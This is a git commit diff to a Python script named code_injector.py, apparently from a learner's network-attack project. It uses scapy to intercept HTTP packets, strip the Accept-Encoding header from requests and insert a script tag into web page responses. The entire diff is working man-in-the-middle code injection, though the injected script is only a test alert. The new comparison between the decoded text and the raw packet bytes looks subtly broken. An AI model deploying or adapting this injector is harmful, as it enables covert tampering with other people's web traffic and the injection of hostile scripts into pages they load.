2526f44df913a33a78c63e65e99e186486e55216
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-29 16:36:04 +0200

    refactoring
    + added variable for scapy_packet[scapy.Raw].load
    + added new if clause that checks if load has been modified and only than executes the code

--- code_injector.py
+++ code_injector.py
@@ -17,16 +17,17 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = inet.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
+        load = scapy_packet[scapy.Raw].load.decode()
         if scapy_packet[inet.TCP].dport == 80:
             print("Request:")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
-            
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[inet.TCP].sport == 80:
             print("Response:")
-            modified_load = scapy_packet[scapy.Raw].load.replace("<head>", "<script>alert('test');</script><head>")
-            new_packet = set_load(scapy_packet, modified_load)
+            load = load.replace("<head>", "<script>alert('test');</script><head>")
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(bytes(new_packet))
 
     packet.accept()
